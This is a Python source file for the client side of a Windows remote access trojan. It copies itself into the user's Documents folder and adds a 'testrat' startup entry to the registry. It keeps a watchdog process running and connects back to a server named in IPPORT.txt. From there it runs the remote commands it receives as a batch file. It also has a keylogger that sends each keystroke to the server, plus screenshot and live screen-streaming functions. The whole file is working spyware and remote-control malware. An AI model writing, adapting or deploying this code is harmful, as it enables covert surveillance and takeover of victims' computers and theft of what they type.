import socket
import subprocess
from pynput.keyboard import Key, Listener
import logging
import os
import shutil
import threading
import re
from PIL import ImageGrab, Image
import mss
import io
import sys
import signal
import time
import winreg as reg

# Read server IP and port from IPPORT.txt
with open("IPPORT.txt", "r") as f:
    SERVER_IPV6 = f.readline().strip()
    SERVER_IPV4 = f.readline().strip()
    PORT = int(f.readline().strip())

#defining configuration
logging.basicConfig(filename=("t.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")

#define: create listener event on keypress and write to log file
def on_press(key):
    logging.info(str(key))
    with open("t.txt", "r") as fileee:
        data = fileee.read().encode()
    with open("t.txt", "w") as fileee:
        fileee.write('')
    s.send(data)

def run_command(command):
    result = subprocess.run(command, capture_output=True, text=True)
    with open("command_output.txt", "w") as f:
        f.write(result.stdout)

quit = 0

keylogging = threading.Event()
stop_keylogging = threading.Event()
stop_check = threading.Event()

def START():
    while not stop_keylogging.is_set():
        while keylogging.is_set():
            with Listener(on_press=on_press) as listener:
                listener.join() #join main thread after listening

def kill_client():
    os.kill(os.getpid(), signal.SIGTERM)

def copy_to_root_and_set_startup():
    try:
        # Copy the script and IPPORT.txt to the current user's documents directory
        user_documents = os.path.join(os.environ['USERPROFILE'], 'Documents')
        script_path = os.path.abspath(__file__)
        ipport_path = os.path.join(os.path.dirname(script_path), "IPPORT.txt")
        watchdog_path = os.path.join(os.path.dirname(script_path), "watchdog.exe")

        print(f"Script path: {script_path}")
        print(f"IPPORT path: {ipport_path}")
        print(f"Watchdog path: {watchdog_path}")

        shutil.copy(script_path, user_documents)
        shutil.copy(ipport_path, user_documents)
        shutil.copy(watchdog_path, user_documents)

        # Set the script to run on startup
        key = reg.HKEY_CURRENT_USER
        key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        open_key = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
        reg.SetValueEx(open_key, "testrat", 0, reg.REG_SZ, os.path.join(user_documents, os.path.basename(script_path)))
        reg.CloseKey(open_key)
        print("Files copied and startup set successfully.")
    except Exception as e:
        print(f"Failed to copy to root and set startup: {e}")

copy_to_root_and_set_startup()
def connect_to_server():
    global s
    try:
        # Try IPv6 connection
        s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
        s.connect((SERVER_IPV6, PORT, 0, 0))
    except:
        # Fallback to IPv4 connection
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((SERVER_IPV4, PORT))

def is_process_running(process_name):
    try:
        # Check if there is any running process that contains the given name process_name.
        for line in os.popen("tasklist"):
            if process_name in line:
                return True
    except Exception as e:
        print(f"Error checking process: {e}")
    return False

def start_process(executable_path):
    try:
        subprocess.Popen(executable_path)
        print(f"Started {executable_path}")
    except Exception as e:
        print(f"Error starting process: {e}")

def watchdog_check():
    process_name = "watchdog.exe"
    user_documents = os.path.join(os.environ['USERPROFILE'], 'Documents')
    executable_path = os.path.join(user_documents, "watchdog.exe")

    while not stop_check.is_set():
        if not is_process_running(process_name):
            start_process(executable_path)
        time.sleep(1)  # Check every 10 seconds

# Start the watchdog check in a separate thread
watchdog_thread = threading.Thread(target=watchdog_check)
watchdog_thread.daemon = True
watchdog_thread.start()

# Copy the script and IPPORT.txt to the root directory and set it to run on startup

while (quit == 0):

    #Try connecting without exiting with an error, until it is connected to the server.
    #heh, incase they disconnect after being connected to sigma server
    while True:
        try:
            connect_to_server()
            msg = s.recv(1024).decode()
            print('[*] server:', msg)
        except:
            s.close()
            continue
        break
    try:
        while (quit == 0):
            TR = s.recv(1024).decode()
            transferToBat = re.sub(r';', '\n', TR)
            with open("vbucks.bat", "w") as file:
                file.write(transferToBat)
            print(f'[+] received command: {transferToBat}')

            #quit custom command
            if transferToBat in ['q', 'quit', 'x', 'exit']:
                quit = 1

            #kill client custom command
            if transferToBat == 'kill':
                kill_client()

            #keylogger custom command
            #starts keylogging and sends to server
            if transferToBat == 'k1':
                if keylogging.is_set():
                    result = '[*] keylogger already on'.encode()
                    s.send(result)
                else:
                    result = '[*] keylogger enabled'.encode()
                    s.send(result)
                    keylogging.set()
                    keylogging_thread = threading.Thread(target=START)
                    keylogging_thread.start()
            elif transferToBat == 'k0':
                if not keylogging.is_set():
                    result = '[*] keylogger already off'.encode()
                    s.send(result)
                else:
                    result = '[*] keylogger disabled'.encode()
                    s.send(result)
                    keylogging.clear()
                    stop_keylogging.set()

            # Screenshot command
            elif transferToBat == 'screenshot':
                try:
                    screenshot = ImageGrab.grab()
                    screenshot.save("screenshot.png")
                    with open("screenshot.png", 'rb') as f:
                        file_data = f.read()
                    file_info = f"screenshot.png|{len(file_data)}"
                    s.send(file_info.encode())
                    s.sendall(file_data)
                except Exception as e:
                    s.send(f"Error: {str(e)}".encode())

            # Stream command
            elif transferToBat == 'stream':
                try:
                    with mss.mss() as sct:
                        while True:
                            screenshot = sct.grab(sct.monitors[1])
                            img = Image.frombytes('RGB', (screenshot.width, screenshot.height), screenshot.rgb)
                            with io.BytesIO() as output:
                                img.save(output, format="JPEG")
                                stringData = output.getvalue()
                            s.send(str(len(stringData)).ljust(16).encode())
                            s.sendall(stringData)
                except Exception as e:
                    s.send(f"Error: {str(e)}".encode())
            elif transferToBat == 'stop_check':
                stop_check.set()
                s.send('[*] stop_check event set'.encode())

            try:
                result = subprocess.check_output("vbucks.bat", text=True)
                s.send(result.encode())
                with open("vbucks.bat", "w") as file:
                    file.write('')  # Clear the contents of vbucks.bat after execution
            except Exception as e:
                s.send(f"Error: {str(e)}".encode())
            
    except UnicodeDecodeError:
        pass
    except Exception as F:
        print(str(F))
        print("[-] Server: disconnected")
        s.close()
        
s.close()